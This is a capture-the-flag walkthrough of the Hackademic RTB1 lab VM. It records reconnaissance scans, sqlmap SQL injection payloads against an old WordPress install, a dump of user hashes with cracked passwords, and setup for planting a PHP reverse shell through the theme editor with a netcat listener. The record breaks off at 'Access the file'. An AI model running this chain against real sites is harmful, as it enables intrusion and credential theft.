@@ -1,0 +1,676 @@
+URL : https://www.vulnhub.com/entry/hackademic-rtb1,17/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover 
+ Currently scanning: 192.168.254.0/16   |   Screen View: Unique Hosts                                                                                                                                             
+                                                                                                                                                                                                                  
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                  
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 192.168.174.1   00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.2   00:50:56:e9:67:44    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.136 00:0c:29:b5:f4:ff    01    060   VMware, Inc.                                                                                                                                                    
+ 192.168.174.254 00:50:56:f8:97:d7    01    060   VMWare, Inc.                                                                                                                                                    
+
+root@kali:~# 
+
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A 192.168.174.136
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-01-28 09:38 EST
+Nmap scan report for 192.168.174.136
+Host is up (0.00069s latency).
+Not shown: 65533 filtered ports
+PORT   STATE  SERVICE VERSION
+22/tcp closed ssh
+80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
+| http-methods: Potentially risky methods: TRACE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: Hackademic.RTB1  
+MAC Address: 00:0C:29:B5:F4:FF (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.22 - 2.6.36
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.69 ms 192.168.174.136
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 161.57 seconds
+root@kali:~#
+
+3.) Enumerate port 80
+http://192.168.174.136/
+http://192.168.174.136/Hackademic_RTB1/
+
+Run nikto
+root@kali:~# nikto -h http://192.168.174.136/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.174.136
++ Target Hostname:    192.168.174.136
++ Target Port:        80
++ Start Time:         2016-01-28 11:02:59 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.15 (Fedora)
++ Server leaks inodes via ETags, header found with file /, inode: 12748, size: 1475, mtime: Sun Jan  9 12:22:11 2011
++ The anti-clickjacking X-Frame-Options header is not present.
++ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7354 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2016-01-28 11:03:11 (GMT-5) (12 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+root@kali:~# nikto -h http://192.168.174.136/Hackademic_RTB1/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.174.136
++ Target Hostname:    192.168.174.136
++ Target Port:        80
++ Start Time:         2016-01-28 11:03:58 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.15 (Fedora)
++ Retrieved x-powered-by header: PHP/5.3.3
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ /Hackademic_RTB1/index.php/\"><script><script>alert(document.cookie)</script><: eZ publish v3 and prior allow Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-12184: /Hackademic_RTB1/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /Hackademic_RTB1/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /Hackademic_RTB1/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /Hackademic_RTB1/xmlrpc.php: xmlrpc.php was found.
++ Server leaks inodes via ETags, header found with file /Hackademic_RTB1/readme.html, inode: 84645, size: 8783, mtime: Fri Jan  7 05:10:04 2011
++ /Hackademic_RTB1/readme.html: This WordPress file reveals the installed version.
++ OSVDB-3092: /Hackademic_RTB1/license.txt: License file found may identify site software.
++ 6603 requests: 0 error(s) and 13 item(s) reported on remote host
++ End Time:           2016-01-28 11:04:14 (GMT-5) (16 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+root@kali:~#
+
+http://192.168.174.136/Hackademic_RTB1/readme.html
+
+Run wpscan
+root@kali:~# wpscan -u http://192.168.174.136/Hackademic_RTB1/
+_______________________________________________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team 
+                       Version 2.6
+          Sponsored by Sucuri - https://sucuri.net
+   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
+_______________________________________________________________
+
+[+] URL: http://192.168.174.136/Hackademic_RTB1/
+[+] Started: Thu Jan 28 11:06:22 2016
+
+[!] The WordPress 'http://192.168.174.136/Hackademic_RTB1/readme.html' file exists exposing a version number
+[+] Interesting header: SERVER: Apache/2.2.15 (Fedora)
+[+] Interesting header: X-POWERED-BY: PHP/5.3.3
+[+] XML-RPC Interface available under: http://192.168.174.136/Hackademic_RTB1/xmlrpc.php
+
+[+] WordPress version 1.5.1.1 identified from meta generator
+[!] 12 vulnerabilities identified from the version number
+
+[!] Title: Wordpress 1.5.1 - 2.0.2 wp-register.php Multiple Parameter XSS
+    Reference: https://wpvulndb.com/vulnerabilities/6033
+    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2007-5105
+    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2007-5106
+    Reference: http://osvdb.org/38577
+[i] Fixed in: 2.0.2
+
+[!] Title: WordPress <= 1.5.1.1 "add new admin" SQL Injection Exploit
+    Reference: https://wpvulndb.com/vulnerabilities/6036
+    Reference: http://www.exploit-db.com/exploits/1059/
+
+[!] Title: WordPress <= 1.5.1.1 SQL Injection Exploit
+    Reference: https://wpvulndb.com/vulnerabilities/6037
+    Reference: http://www.exploit-db.com/exploits/1033/
+
+[!] Title: WordPress 1.5.1 - 3.5 XMLRPC Pingback API Internal/External Port Scanning
+    Reference: https://wpvulndb.com/vulnerabilities/5988
+    Reference: https://github.com/FireFart/WordpressPingbackPortScanner
+    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-0235
+[i] Fixed in: 3.5.1
+
+[!] Title: WordPress 1.5.1 - 3.5 XMLRPC pingback additional issues
+    Reference: https://wpvulndb.com/vulnerabilities/5989
+    Reference: http://lab.onsec.ru/2013/01/wordpress-xmlrpc-pingback-additional.html
+
+[!] Title: WordPress 1.5 & 1.5.1.1 - SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/7615
+    Reference: http://www.securityfocus.com/bid/13809
+    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2005-1810
+[i] Fixed in: 1.5.1.2
+
+[!] Title: WordPress <= 4.0 - Long Password Denial of Service (DoS)
+    Reference: https://wpvulndb.com/vulnerabilities/7681
+    Reference: http://www.behindthefirewalls.com/2014/11/wordpress-denial-of-service-responsible-disclosure.html
+    Reference: https://wordpress.org/news/2014/11/wordpress-4-0-1/
+    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9034
+    Reference: http://osvdb.org/114857
+    Reference: http://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_long_password_dos
+    Reference: http://www.exploit-db.com/exploits/35413/
+    Reference: http://www.exploit-db.com/exploits/35414/
+[i] Fixed in: 4.0.1
+
+[!] Title: WordPress <= 4.0 - CSRF in wp-login.php Password Reset
+    Reference: https://wpvulndb.com/vulnerabilities/7691
+    Reference: https://core.trac.wordpress.org/changeset/30418
+    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9033
+[i] Fixed in: 4.0.1
+
+[!] Title: WordPress <= 4.0 - Server Side Request Forgery (SSRF)
+    Reference: https://wpvulndb.com/vulnerabilities/7696
+    Reference: http://www.securityfocus.com/bid/71234
+    Reference: https://core.trac.wordpress.org/changeset/30444
+    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9038
+[i] Fixed in: 4.0.1
+
+[!] Title: WordPress <= 1.5.1.2 - XMLRPC Eval Injection 
+    Reference: https://wpvulndb.com/vulnerabilities/7765
+    Reference: http://www.securityfocus.com/bid/14088
+    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2005-1921
+
+[!] Title: WordPress <= 1.5.1.2 - Multiple Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/7766
+    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2005-2107
+    Reference: https://secunia.com/advisories/15831
+
+[!] Title: WordPress <= 1.5.1.2 - Email Spoofing
+    Reference: https://wpvulndb.com/vulnerabilities/7767
+    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2005-2109
+    Reference: https://secunia.com/advisories/15831
+
+[+] WordPress theme in use: starburst - v1.1
+
+[+] Name: starburst - v1.1
+ |  Location: http://192.168.174.136/Hackademic_RTB1/wp-content/themes/starburst/
+ |  Style URL: http://192.168.174.136/Hackademic_RTB1/wp-content/themes/starburst/style.css
+ |  Referenced style.css: /wp-content/themes/starburst/style.css
+ |  Theme Name: Starburst
+ |  Theme URI: http://starburst.weirdncrazy.com
+ |  Description: A WordPress 1.5/2.* theme.
+ |  Author: Claire
+ |  Author URI: http://www.weirdncrazy.com/universe/
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found
+
+[+] Finished: Thu Jan 28 11:06:23 2016
+[+] Memory used: 1.066 MB
+[+] Elapsed time: 00:00:00
+root@kali:~# 
+
+Interested in
+[!] Title: WordPress <= 1.5.1.1 SQL Injection Exploit
+    Reference: https://wpvulndb.com/vulnerabilities/6037
+    Reference: http://www.exploit-db.com/exploits/1033/
+    
+http://192.168.174.136/Hackademic_RTB1/?cat='
+WordPress database error: [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\\' LIMIT 1' at line 1] SELECT * FROM wp_categories WHERE cat_ID = \\\' LIMIT 1
+
+Run sqlmap
+root@kali:~# sqlmap -u http://192.168.174.136/Hackademic_RTB1/?cat=1 --dbs
+
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 11:25:18
+
+[11:25:18] [INFO] testing connection to the target URL
+[11:25:18] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+[11:25:18] [INFO] testing if the target URL is stable. This can take a couple of seconds
+[11:25:19] [INFO] target URL is stable
+[11:25:19] [INFO] testing if GET parameter 'cat' is dynamic
+[11:25:19] [INFO] confirming that GET parameter 'cat' is dynamic
+[11:25:19] [INFO] GET parameter 'cat' is dynamic
+[11:25:19] [INFO] heuristic (basic) test shows that GET parameter 'cat' might be injectable (possible DBMS: 'MySQL')
+[11:25:19] [INFO] testing for SQL injection on GET parameter 'cat'
+heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] 
+[11:25:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:25:24] [WARNING] reflective value(s) found and filtering out
+[11:25:24] [INFO] GET parameter 'cat' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Hackademic.RTB1   \\?bb Uncategorized")
+[11:25:24] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
+[11:25:24] [INFO] GET parameter 'cat' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable 
+[11:25:24] [INFO] testing 'MySQL inline queries'
+[11:25:24] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[11:25:24] [WARNING] time-based comparison requires larger statistical model, please wait...................                                                                                                      
+[11:25:25] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[11:25:25] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
+[11:25:45] [INFO] GET parameter 'cat' seems to be 'MySQL > 5.0.11 AND time-based blind' injectable 
+[11:25:45] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[11:25:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[11:25:45] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[11:25:45] [INFO] target URL appears to have 5 columns in query
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
+[11:25:49] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. --dbms=mysql) 
+[11:25:49] [INFO] testing 'MySQL UNION query (47) - 22 to 40 columns'
+[11:25:49] [INFO] testing 'MySQL UNION query (47) - 42 to 60 columns'
+[11:25:50] [INFO] testing 'MySQL UNION query (47) - 62 to 80 columns'
+[11:25:50] [INFO] testing 'MySQL UNION query (47) - 82 to 100 columns'
+[11:25:51] [INFO] testing 'Generic UNION query (47) - 1 to 20 columns'
+GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection points with a total of 143 HTTP(s) requests:
+---
+Place: GET
+Parameter: cat
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 2614=2614
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: cat=1 AND (SELECT 3694 FROM(SELECT COUNT(*),CONCAT(0x7172707271,(SELECT (CASE WHEN (3694=3694) THEN 1 ELSE 0 END)),0x7166767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: cat=1 AND SLEEP(5)
+---
+[11:26:08] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[11:26:08] [INFO] fetching database names
+[11:26:09] [INFO] the SQL query used returns 3 entries
+[11:26:09] [INFO] retrieved: information_schema
+[11:26:09] [INFO] retrieved: mysql
+[11:26:09] [INFO] retrieved: wordpress
+available databases [3]:
+[*] information_schema
+[*] mysql
+[*] wordpress
+
+[11:26:09] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 152 times
+[11:26:09] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/192.168.174.136'
+
+[*] shutting down at 11:26:09
+
+root@kali:~# sqlmap -u http://192.168.174.136/Hackademic_RTB1/?cat=1 -D wordpress --tables
+
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 11:27:49
+
+[11:27:49] [INFO] resuming back-end DBMS 'mysql' 
+[11:27:49] [INFO] testing connection to the target URL
+[11:27:49] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: cat
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 2614=2614
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: cat=1 AND (SELECT 3694 FROM(SELECT COUNT(*),CONCAT(0x7172707271,(SELECT (CASE WHEN (3694=3694) THEN 1 ELSE 0 END)),0x7166767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: cat=1 AND SLEEP(5)
+---
+[11:27:49] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[11:27:49] [INFO] fetching tables for database: 'wordpress'
+[11:27:49] [WARNING] reflective value(s) found and filtering out
+[11:27:49] [INFO] the SQL query used returns 9 entries
+[11:27:49] [INFO] retrieved: wp_categories
+[11:27:49] [INFO] retrieved: wp_comments
+[11:27:49] [INFO] retrieved: wp_linkcategories
+[11:27:49] [INFO] retrieved: wp_links
+[11:27:50] [INFO] retrieved: wp_options
+[11:27:50] [INFO] retrieved: wp_post2cat
+[11:27:50] [INFO] retrieved: wp_postmeta
+[11:27:50] [INFO] retrieved: wp_posts
+[11:27:50] [INFO] retrieved: wp_users
+Database: wordpress
+[9 tables]
++-------------------+
+| wp_categories     |
+| wp_comments       |
+| wp_linkcategories |
+| wp_links          |
+| wp_options        |
+| wp_post2cat       |
+| wp_postmeta       |
+| wp_posts          |
+| wp_users          |
++-------------------+
+
+[11:27:50] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 11 times
+[11:27:50] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/192.168.174.136'
+
+[*] shutting down at 11:27:50
+
+root@kali:~# sqlmap -u http://192.168.174.136/Hackademic_RTB1/?cat=1 -D wordpress -T wp_users --columns
+
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 11:28:19
+
+[11:28:19] [INFO] resuming back-end DBMS 'mysql' 
+[11:28:19] [INFO] testing connection to the target URL
+[11:28:19] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: cat
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 2614=2614
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: cat=1 AND (SELECT 3694 FROM(SELECT COUNT(*),CONCAT(0x7172707271,(SELECT (CASE WHEN (3694=3694) THEN 1 ELSE 0 END)),0x7166767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: cat=1 AND SLEEP(5)
+---
+[11:28:19] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[11:28:19] [INFO] fetching columns for table 'wp_users' in database 'wordpress'
+[11:28:19] [WARNING] reflective value(s) found and filtering out
+[11:28:19] [INFO] the SQL query used returns 22 entries
+[11:28:20] [INFO] retrieved: ID
+[11:28:20] [INFO] retrieved: bigint(20) unsigned
+[11:28:20] [INFO] retrieved: user_login
+[11:28:20] [INFO] retrieved: varchar(60)
+[11:28:20] [INFO] retrieved: user_pass
+[11:28:20] [INFO] retrieved: varchar(64)
+[11:28:20] [INFO] retrieved: user_firstname
+[11:28:20] [INFO] retrieved: varchar(50)
+[11:28:20] [INFO] retrieved: user_lastname
+[11:28:20] [INFO] retrieved: varchar(50)
+[11:28:20] [INFO] retrieved: user_nickname
+[11:28:20] [INFO] retrieved: varchar(50)
+[11:28:20] [INFO] retrieved: user_nicename
+[11:28:20] [INFO] retrieved: varchar(50)
+[11:28:20] [INFO] retrieved: user_icq
+[11:28:20] [INFO] retrieved: int(10) unsigned
+[11:28:20] [INFO] retrieved: user_email
+[11:28:20] [INFO] retrieved: varchar(100)
+[11:28:20] [INFO] retrieved: user_url
+[11:28:20] [INFO] retrieved: varchar(100)
+[11:28:20] [INFO] retrieved: user_ip
+[11:28:20] [INFO] retrieved: varchar(15)
+[11:28:20] [INFO] retrieved: user_domain
+[11:28:21] [INFO] retrieved: varchar(200)
+[11:28:21] [INFO] retrieved: user_browser
+[11:28:21] [INFO] retrieved: varchar(200)
+[11:28:21] [INFO] retrieved: user_registered
+[11:28:21] [INFO] retrieved: datetime
+[11:28:21] [INFO] retrieved: user_level
+[11:28:21] [INFO] retrieved: int(2) unsigned
+[11:28:21] [INFO] retrieved: user_aim
+[11:28:21] [INFO] retrieved: varchar(50)
+[11:28:21] [INFO] retrieved: user_msn
+[11:28:21] [INFO] retrieved: varchar(100)
+[11:28:21] [INFO] retrieved: user_yim
+[11:28:21] [INFO] retrieved: varchar(50)
+[11:28:21] [INFO] retrieved: user_idmode
+[11:28:21] [INFO] retrieved: varchar(20)
+[11:28:21] [INFO] retrieved: user_activation_key
+[11:28:21] [INFO] retrieved: varchar(60)
+[11:28:21] [INFO] retrieved: user_status
+[11:28:21] [INFO] retrieved: int(11)
+[11:28:21] [INFO] retrieved: user_description
+[11:28:21] [INFO] retrieved: longtext
+Database: wordpress
+Table: wp_users
+[22 columns]
++---------------------+---------------------+
+| Column              | Type                |
++---------------------+---------------------+
+| ID                  | bigint(20) unsigned |
+| user_activation_key | varchar(60)         |
+| user_aim            | varchar(50)         |
+| user_browser        | varchar(200)        |
+| user_description    | longtext            |
+| user_domain         | varchar(200)        |
+| user_email          | varchar(100)        |
+| user_firstname      | varchar(50)         |
+| user_icq            | int(10) unsigned    |
+| user_idmode         | varchar(20)         |
+| user_ip             | varchar(15)         |
+| user_lastname       | varchar(50)         |
+| user_level          | int(2) unsigned     |
+| user_login          | varchar(60)         |
+| user_msn            | varchar(100)        |
+| user_nicename       | varchar(50)         |
+| user_nickname       | varchar(50)         |
+| user_pass           | varchar(64)         |
+| user_registered     | datetime            |
+| user_status         | int(11)             |
+| user_url            | varchar(100)        |
+| user_yim            | varchar(50)         |
++---------------------+---------------------+
+
+[11:28:21] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 46 times
+[11:28:21] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/192.168.174.136'
+
+[*] shutting down at 11:28:21
+
+root@kali:~# sqlmap -u http://192.168.174.136/Hackademic_RTB1/?cat=1 -D wordpress -T wp_users -C user_level,user_login,user_pass --dump
+
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 11:28:56
+
+[11:28:56] [INFO] resuming back-end DBMS 'mysql' 
+[11:28:56] [INFO] testing connection to the target URL
+[11:28:56] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: cat
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 2614=2614
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: cat=1 AND (SELECT 3694 FROM(SELECT COUNT(*),CONCAT(0x7172707271,(SELECT (CASE WHEN (3694=3694) THEN 1 ELSE 0 END)),0x7166767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: cat=1 AND SLEEP(5)
+---
+[11:28:56] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[11:28:56] [INFO] fetching columns 'user_level, user_login, user_pass' for table 'wp_users' in database 'wordpress'
+[11:28:56] [WARNING] reflective value(s) found and filtering out
+[11:28:56] [INFO] the SQL query used returns 3 entries
+[11:28:56] [INFO] retrieved: user_login
+[11:28:57] [INFO] retrieved: varchar(60)
+[11:28:57] [INFO] retrieved: user_pass
+[11:28:57] [INFO] retrieved: varchar(64)
+[11:28:57] [INFO] retrieved: user_level
+[11:28:57] [INFO] retrieved: int(2) unsigned
+[11:28:57] [INFO] fetching entries of column(s) 'user_level, user_login, user_pass' for table 'wp_users' in database 'wordpress'
+[11:28:57] [INFO] the SQL query used returns 6 entries
+[11:28:57] [INFO] retrieved: 1
+[11:28:57] [INFO] retrieved: NickJames
+[11:28:57] [INFO] retrieved: 21232f297a57a5a743894a0e4a801fc3
+[11:28:57] [INFO] retrieved: 0
+[11:28:57] [INFO] retrieved: MaxBucky
+[11:28:57] [INFO] retrieved: 50484c19f1afdaf3841a0d821ed393d2
+[11:28:57] [INFO] retrieved: 10
+[11:28:57] [INFO] retrieved: GeorgeMiller
+[11:28:57] [INFO] retrieved: 7cbb3252ba6b7e9c422fac5334d22054
+[11:28:57] [INFO] retrieved: 0
+[11:28:57] [INFO] retrieved: JasonKonnors
+[11:28:57] [INFO] retrieved: 8601f6e1028a8e8a966f6c33fcd9aec4
+[11:28:57] [INFO] retrieved: 0
+[11:28:57] [INFO] retrieved: TonyBlack
+[11:28:57] [INFO] retrieved: a6e514f9486b83cb53d8d932f9a04292
+[11:28:57] [INFO] retrieved: 0
+[11:28:57] [INFO] retrieved: JohnSmith
+[11:28:58] [INFO] retrieved: b986448f0bb9e5e124ca91d3d650f52c
+[11:28:58] [INFO] analyzing table dump for possible password hashes
+[11:28:58] [INFO] recognized possible password hashes in column 'user_pass'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
+do you want to crack them via a dictionary-based attack? [Y/n/q] 
+[11:29:02] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 
+[11:29:06] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] 
+[11:29:09] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[11:29:13] [INFO] cracked password 'admin' for hash '21232f297a57a5a743894a0e4a801fc3'                                                                                                                            
+[11:29:18] [INFO] cracked password 'kernel' for hash '50484c19f1afdaf3841a0d821ed393d2'                                                                                                                           
+[11:29:20] [INFO] cracked password 'maxwell' for hash '8601f6e1028a8e8a966f6c33fcd9aec4'                                                                                                                          
+[11:29:20] [INFO] cracked password 'napoleon' for hash 'a6e514f9486b83cb53d8d932f9a04292'                                                                                                                         
+[11:29:21] [INFO] cracked password 'q1w2e3' for hash '7cbb3252ba6b7e9c422fac5334d22054'                                                                                                                           
+[11:29:25] [INFO] postprocessing table dump                                                                                                                                                                       
+Database: wordpress
+Table: wp_users
+[6 entries]
++---------------------------------------------+--------------+------------+
+| user_pass                                   | user_login   | user_level |
++---------------------------------------------+--------------+------------+
+| 21232f297a57a5a743894a0e4a801fc3 (admin)    | NickJames    | 1          |
+| 50484c19f1afdaf3841a0d821ed393d2 (kernel)   | MaxBucky     | 0          |
+| 7cbb3252ba6b7e9c422fac5334d22054 (q1w2e3)   | GeorgeMiller | 10         |
+| 8601f6e1028a8e8a966f6c33fcd9aec4 (maxwell)  | JasonKonnors | 0          |
+| a6e514f9486b83cb53d8d932f9a04292 (napoleon) | TonyBlack    | 0          |
+| b986448f0bb9e5e124ca91d3d650f52c            | JohnSmith    | 0          |
++---------------------------------------------+--------------+------------+
+
+[11:29:25] [INFO] table 'wordpress.wp_users' dumped to CSV file '/usr/share/sqlmap/output/192.168.174.136/dump/wordpress/wp_users.csv'
+[11:29:25] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 27 times
+[11:29:25] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/192.168.174.136'
+
+[*] shutting down at 11:29:25
+
+root@kali:~# 
+
+In Browser
+http://192.168.174.136/Hackademic_RTB1/wp-admin
+http://192.168.174.136/Hackademic_RTB1/wp-login.php?redirect_to=%2FHackademic_RTB1%2Fwp-admin%2F
+GeorgeMiller has a user_level of 10 which is admin level in WordPress
+Username : GeorgeMiller
+Password : q1w2e3
+http://192.168.174.136/Hackademic_RTB1/wp-admin/theme-editor.php?file=wp-content/themes/starburst/404.php&theme=Starburst
+Update the 404.php file with php reverse shell
+
+Setup the listener
+root@kali:~# nc -nlvp 1234
+listening on [any] 1234 ...
+
+Access the file
